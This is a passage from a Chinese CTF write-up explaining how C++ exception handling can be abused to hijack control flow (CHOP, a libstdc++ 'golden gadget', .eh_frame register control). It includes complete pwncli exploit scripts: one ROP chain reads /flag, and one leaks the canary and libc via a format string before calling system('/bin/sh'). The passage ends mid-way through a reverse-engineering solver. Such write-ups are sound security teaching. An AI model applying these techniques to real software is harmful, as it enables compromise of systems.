handler，并不会执行发生异常所在函数的剩余部分，自然也就不会执行<code>ret</code>，因而依靠劫持返回地址直接进行跳转的攻击方式不再有效</p><p>栈上的内容(如这里的rbp和ret地址)与异常处理的流程相关</p><p>覆盖rbp会导致crash,可以确定是在执行handler时出错</p><p>可以很容易的知道，由于这里使用<code>leave; ret</code>，ret的地址为<code>[rbp+8]</code>，即这里是可以通过合理控制rbp来控制返回地址</p><p>需要让rbp为一个指针，且rbp内容恰好是我们覆盖的ret地址</p><p>异常处理本身存在一些问题，并且使得canary这样的栈保护机制无效。因为异常抛出后的代码不会执行，自然也不会检测canary，自然也不会调用<code>stack_check_fail()</code>. 在此基础上我们发现了一些控制程序流的方式：</p><ul><li>通过覆盖rbp，进而控制程序流走向。当然前提是栈帧的确使用rbp存储，因为一些情况下程序只依靠rsp增减。</li><li>通过覆盖ret地址，使异常被另外一个<code>handler</code>处理</li><li>在某些情况下还可以通过伪造覆盖类虚表的手法，使其在<code>cleanup handler</code>执行析构函数的时候劫持程序流(本文不做详细分析)</li></ul><h3 id="CHOP"><a href="#CHOP" class="headerlink" title="CHOP"></a>CHOP</h3><p>CHOP全称Catch Handler Oriented Programming，通过扰乱unwinder来实现程序流劫持的效果。在文章中提到了一个所谓<strong>Gloden Gadget</strong>，即如下代码片段（取自stdlibc++.so）</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">__cxa_call_unexpected</span> <span class="hljs-params">(<span class="hljs-keyword">void</span> *exc_obj_in)</span> </span>&#123;<br> xh_terminate_handler = xh-&gt;terminateHandler;<br> <span class="hljs-keyword">try</span> &#123; <span class="hljs-comment">/* ... */</span> &#125;<br> <span class="hljs-keyword">catch</span> (...) &#123;<br> __terminate(xh_terminate_handler);<br> &#125;<br>&#125;<br><br><span class="hljs-keyword">void</span> __terminate (<span class="hljs-keyword">void</span> (*<span class="hljs-keyword">handler</span>)()) <span class="hljs-keyword">throw</span> () &#123;<br> <span class="hljs-comment">/* ... */</span><br> <span class="hljs-keyword">handler</span>();<br> std::abort();<br>&#125;<br></code></pre></td></tr></table></figure><p>在函数<code>__cxa_call_unexpected()</code>中的catch块，传入了<code>xh_terminate_handler</code>，并在<code>__terminate()</code>中进行调用，这意味着，如果我们将ret地址调整为<code>__cxa_call_unexpected()</code>的try块，同时控制局部变量<code>xh_terminate_handler</code>为任意地址，即可实现控制流劫持</p><p>众所周知,在最终执行catch handler时，栈帧与抛出异常时相同。因而局部变量是可控的，似乎<strong>Gloden Gadget</strong>为我们提供了一个可以任意指针调用的机会</p><p>libc版本迭代非常快，这种利用在目前较高版本是否可行呢？？？</p><p>事实上，在ubuntu22.04上的所谓的<strong>Gloden Gadgget</strong>调用流程变为为<code>__cxa_call_unexpected()</code> ==&gt; <code>__cxa_call_unexpected.cold()</code> ==&gt; <code>__terminate()</code></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs scss">void __cxa_call_unexpected (void *exc_obj_in) &#123;<br> try &#123; <span class="hljs-comment">/* ... */</span> &#125;<br> catch (...) &#123;<br>    <span class="hljs-built_in">__cxa_call_unexpected_cold</span>(a1)<br> &#125;<br>&#125;<br>void <span class="hljs-built_in">_cxa_call_unexpected_cold</span>(void *a1) &#123;<br>    void (*v2)(void); <span class="hljs-comment">// r12</span><br>    void *retaddr; <span class="hljs-comment">// [rsp+0h] [rbp+0h] BYREF</span><br>    <span class="hljs-comment">/*...*/</span><br>    if (!check_exception_spec(&amp;retaddr, ...)) &#123;<br>        if (check_exception_spec(&amp;retaddr, ... )) &#123;<br>          <span class="hljs-comment">/*...*/</span><br>          <span class="hljs-built_in">_cxa_throw</span>();<br>        &#125;<br>        <span class="hljs-built_in">__terminate</span>(v2);<br>    &#125;<br>&#125;<br><br>void __terminate (void (*handler)()) throw () &#123;<br> <span class="hljs-comment">/* ... */</span><br> <span class="hljs-built_in">handler</span>();<br> std::<span class="hljs-built_in">abort</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>terminate执行的handler变成了寄存器r12的值，同时需要控制局部变量进入<code>_cxa_call_unexpected_cold()</code>中合适的分支，防止中途再次抛出异常或是直接crash掉进程。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">r12</span><br><span class="hljs-built_in">db</span>      <span class="hljs-number">67h</span><br><span class="hljs-keyword">call</span>    __terminate <span class="hljs-comment">; __cxxabiv1::__terminate(void (*)(void))</span><br></code></pre></td></tr></table></figure><p>局部变量还是比较好控制的，但是寄存器如何控制呢？我们已知栈溢出可以控制栈上数据，如果有方法将栈上数据与寄存器做以联系，寄存器就应该可控了。这时我们就需要利用到<code>.eh_frame</code>上的信息了，使用<code>readelf -wF file</code>，我们可以窥见其中的奥秘</p><p>.eh_frame section 主要由CFI, CIE和FDE组成。每个程序的section会包含一个或者多个CFI(Call Frame Information)。每个CFI包含一个CIE(Common Information Entry Record)记录，每个CIE包含一个或者多个FDE(Frame Description Entry)记录。</p><p>需要注意的是，.eh_frame和unwind的流程强相关，因而通过 -s 参数来去除符号表是无法去掉.eh_frame section的相关信息的</p><p>通过readelf得到的信息大致如下，可以看到寄存器可以值与CFA相关，而CFA均为栈地址。一般我们找rsp+8的条目且能控制寄存器的即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00000654</span> <span class="hljs-number">000000000000004</span>c <span class="hljs-number">000005</span>f8 FDE cie=<span class="hljs-number">00000060</span> pc=<span class="hljs-number">00000000004027</span>e0..<span class="hljs-number">0000000000402</span>db0<br>   <span class="hljs-attribute">LOC</span>           CFA      rbx   rbp   r12   r13   r14   r15   ra    <br><span class="hljs-attribute">00000000004027e0</span> rsp+<span class="hljs-number">8</span>    u     u     u     u     u     u     c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004027e6</span> rsp+<span class="hljs-number">16</span>   u     u     u     u     u     c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004027e8</span> rsp+<span class="hljs-number">24</span>   u     u     u     u     c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004027ea</span> rsp+<span class="hljs-number">32</span>   u     u     u     c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004027ec</span> rsp+<span class="hljs-number">40</span>   u     u     c-<span class="hljs-number">40</span>  c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004027ed</span> rsp+<span class="hljs-number">48</span>   u     c-<span class="hljs-number">48</span>  c-<span class="hljs-number">40</span>  c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004027ee</span> rsp+<span class="hljs-number">56</span>   c-<span class="hljs-number">56</span>  c-<span class="hljs-number">48</span>  c-<span class="hljs-number">40</span>  c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004027f5</span> rsp+<span class="hljs-number">240</span>  c-<span class="hljs-number">56</span>  c-<span class="hljs-number">48</span>  c-<span class="hljs-number">40</span>  c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004028a3</span> rsp+<span class="hljs-number">56</span>   c-<span class="hljs-number">56</span>  c-<span class="hljs-number">48</span>  c-<span class="hljs-number">40</span>  c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004028a4</span> rsp+<span class="hljs-number">48</span>   c-<span class="hljs-number">56</span>  c-<span class="hljs-number">48</span>  c-<span class="hljs-number">40</span>  c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004028a5</span> rsp+<span class="hljs-number">40</span>   c-<span class="hljs-number">56</span>  c-<span class="hljs-number">48</span>  c-<span class="hljs-number">40</span>  c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004028a7</span> rsp+<span class="hljs-number">32</span>   c-<span class="hljs-number">56</span>  c-<span class="hljs-number">48</span>  c-<span class="hljs-number">40</span>  c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004028a9</span> rsp+<span class="hljs-number">24</span>   c-<span class="hljs-number">56</span>  c-<span class="hljs-number">48</span>  c-<span class="hljs-number">40</span>  c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004028ab</span> rsp+<span class="hljs-number">16</span>   c-<span class="hljs-number">56</span>  c-<span class="hljs-number">48</span>  c-<span class="hljs-number">40</span>  c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004028ad</span> rsp+<span class="hljs-number">8</span>    c-<span class="hljs-number">56</span>  c-<span class="hljs-number">48</span>  c-<span class="hljs-number">40</span>  c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span>   <br><span class="hljs-attribute">00000000004028b0</span> rsp+<span class="hljs-number">240</span>  c-<span class="hljs-number">56</span>  c-<span class="hljs-number">48</span>  c-<span class="hljs-number">40</span>  c-<span class="hljs-number">32</span>  c-<span class="hljs-number">24</span>  c-<span class="hljs-number">16</span>  c-<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>为了方便查看不同的栈偏移在局部变量的作用，我将填充内容做以区分。选择任意一个rsp+8且能设置r12寄存器条目，将ret地址覆盖为该内容，将栈内容存入寄存器，最后接上<strong>Golden Gadget</strong>的try块地址用于调用指针</p><p>为了提高调试时局部变量的辨识度，测试payload构造如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">payload = b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*8</span><br>payload += b<span class="hljs-string">&#x27;b&#x27;</span><span class="hljs-number">*8</span><br>payload += b<span class="hljs-string">&#x27;c&#x27;</span><span class="hljs-number">*8</span><br>payload += b<span class="hljs-string">&#x27;d&#x27;</span><span class="hljs-number">*8</span><br>payload += b<span class="hljs-string">&#x27;e&#x27;</span><span class="hljs-number">*8</span><br>payload += b<span class="hljs-string">&#x27;f&#x27;</span><span class="hljs-number">*8</span><br>payload += b<span class="hljs-string">&#x27;g&#x27;</span><span class="hljs-number">*8</span><br>payload += p64(0x004032a4+1)<br>payload += p64(0x402df0+1)<br>io.send(payload)<br></code></pre></td></tr></table></figure><p>在调用到<strong>Gloden Gadget</strong>时，我们已经可以看到寄存器的值被更改为了栈上的内容</p><p><img src="https://ice.frostsky.com/2024/04/22/d9dfac9c036d085a1d655348b56bad40.png" alt="20231103154512-eb5a55f6-7a1c-1"></p><p>然后就是一些分支的局部变量调整，经过一系列对局部变量的调整，我们终于看到了<code>__terminate</code>中调用的handler</p><p><img src="https://ice.frostsky.com/2024/04/22/f088786a4a38324bafc2058937d376cb.png" alt="20231103154526-f39f593c-7a1c-1"></p><p>此时只需要将对应的值替换为后门即可，成功完成利用</p><p>这里局部变量的调试比较枯燥，直接跟着断点看看哪里crash然后更改变量为合适的值即可，不做详细阐述</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br><span class="hljs-keyword">if</span> gift.remote:<br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>gift = <span class="hljs-number">0x4D3350</span><br>vuln = <span class="hljs-number">0x40215C</span><br>main = <span class="hljs-number">0x4021E1</span><br>bss = <span class="hljs-number">0x4D3300</span><br>read_addr = elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000401c72</span><br>pop_rsi = <span class="hljs-number">0x0000000000405285</span><br>pop_rdx = <span class="hljs-number">0x0000000000401aff</span><br>open_addr = elf.sym[<span class="hljs-string">&#x27;open64&#x27;</span>]<br>read_addr = elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts_addr = elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># - - - - - - - - - - - - - #remote</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LLCC&#x27;</span>)<br>    <br>    p1= p64(vuln)+p64(read_addr)<br>    sa(<span class="hljs-string">&quot;Gift&gt; &quot;</span>,p1)<br><br>    p2=p64(<span class="hljs-number">0x1</span>)*<span class="hljs-number">13</span>+p64(<span class="hljs-number">0x2</span>)+p64(gift-<span class="hljs-number">8</span>)<br><br>    sla(<span class="hljs-string">&quot;How much do you know about control?&quot;</span>,p2)<br><br>    sla(<span class="hljs-string">&quot;How much do you know about control?&quot;</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>    <span class="hljs-comment">#0x4d32e0</span><br>    <span class="hljs-comment">#0x4d3360</span><br>    p=<span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x360</span>-<span class="hljs-number">0x2e0</span>-<span class="hljs-number">0x20</span>)<br>    <span class="hljs-comment">#p=b&#x27;/home/lekc/pwn/buu/flag&#x27;.ljust(0x20,b&#x27;\x00&#x27;)+b&#x27;a&#x27;*(0x360-0x2e0-0x20)</span><br>    p+=p64(pop_rdi)+p64(<span class="hljs-number">0x4d32e0</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>    p+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(bss+<span class="hljs-number">0x100</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x100</span>)+p64(read_addr)<br>    p+=p64(pop_rdi)+p64(bss+<span class="hljs-number">0x100</span>)+p64(puts_addr)<br>    pause()<br>    sl(p)<br>  <br><br><span class="hljs-comment">#log</span><br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    <span class="hljs-comment">#log.success(&#x27;libc.address:&#x27;+hex(libc.address))</span><br>    <span class="hljs-comment">#log.success(&#x27;heap_base:&#x27;+hex(heap_base))</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    attack()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><p>和Control一样是Linux下的C++对应的异常处理</p><p>由于最后使用<code>leave; ret</code>，ret的地址为<code>[rbp+8]</code>，即这里是可以通过合理控制rbp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br><span class="hljs-keyword">if</span> gift.remote:<br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #remote</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LLCC&#x27;</span>)<br><br>    p1=<span class="hljs-string">b&#x27;%p,&#x27;</span>*<span class="hljs-number">10</span><br>    p1=<span class="hljs-string">b&#x27;%7$p,%8$p,%9$p,%11$p&#x27;</span><br>    sla(<span class="hljs-string">&quot;please tell me your name&quot;</span>,p1)<br>    ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    canary = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;,&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    stack = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;,&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    elf.address = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;,&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x1480</span><br>    libc.address = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x24083</span><br>    ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>    buf_addr = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)    <br>    CG.set_find_area(find_in_elf=<span class="hljs-literal">True</span>,find_in_libc=<span class="hljs-literal">True</span>)<br>    <span class="hljs-comment">#0xa8</span><br>    p2=p64(canary)<br>    p2=p2.ljust(<span class="hljs-number">104</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    p2+=p64(canary)+p64(buf_addr+<span class="hljs-number">0x18</span>)+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]+<span class="hljs-number">168</span>)+p64(<span class="hljs-number">0</span>)+p64(canary)+p64(buf_addr+<span class="hljs-number">0x560</span>-<span class="hljs-number">0x3d0</span>)+p64(elf.sym[<span class="hljs-string">&#x27;__libc_csu_init&#x27;</span>])+p64(<span class="hljs-number">0</span>)<br>    p2+=p64(CG.ret())+p64(CG.pop_rdi_ret())+p64(CG.bin_sh())+p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>    sa(<span class="hljs-string">&quot;How much do you know about exception?&quot;</span>,p2)<br><span class="hljs-comment">#log</span><br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br>    log.success(<span class="hljs-string">&#x27;elf.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(elf.address))<br>    log.success(<span class="hljs-string">&#x27;canary:&#x27;</span>+<span class="hljs-built_in">hex</span>(canary))<br>    log.success(<span class="hljs-string">&#x27;stack:&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))<br>    log.success(<span class="hljs-string">&#x27;buf_addr:&#x27;</span>+<span class="hljs-built_in">hex</span>(buf_addr))<br>    <span class="hljs-comment">#log.success(&#x27;heap_base:&#x27;+hex(heap_base))</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    attack()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="prese"><a href="#prese" class="headerlink" title="prese"></a>prese</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag = [<span class="hljs-number">0x86</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0x91</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0x84</span>,<span class="hljs-number">0x089</span>,<span class="hljs-number">0xa5</span>,<span class="hljs-number">0xad</span>,<span class="hljs-number">0xad</span>,<span class="hljs-number">0xa6</span>,<span class="hljs-number">0x9d</span>,<span class="hljs-number">0xb6</span>,<span class="hljs-number">0xaa</span>,<span class="hljs-number">0xa7</span>,<span class="hljs-number">0x9d</span>,<span class="hljs-number">0xb0</span>,<span class="hljs-number">0xa7</span>,<span class="hljs-number">0x9d</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0xb1</span>,<span class="hljs-number">0x9d</span>,<span class="hljs-number">0xa7</span>,<span class="hljs-number">0xa3</span>,<span class="hljs-number">0xb1</span>,<span class="hljs-number">0xbb</span>,<span class="hljs-number">0xaa</span>,<span class="hljs-number">0xaa</span>,<span class="hljs-number">0xaa</span>,<span class="hljs-number">0xaa</span>,<span class="hljs-number">0xbf</span>,<span class="hljs-number">0</span>]<br>fff=[<span class="hljs-number">0</span>]*<span class="hljs-number">32</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>):<br>    <span class="hljs-comment">#v21 = ord(fff[i])</span><br>    <span class="hljs-comment">#v22 = tmp[v21]</span><br>    <span class="hljs-comment">#fff[i] = chr(v22)</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x60</span>):<br>        tmp = [<span class="hljs-number">0</span>]*<span class="hljs-number">0x100</span><br>        ff=[<span class="hljs-number">0</span>]*<span class="hljs-number">32</span><br>        f=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>            tmp[i] = ((<span class="hljs-built_in">len</span> ^ i) ^ <span class="hljs-number">0xff</span>)<br>        <span 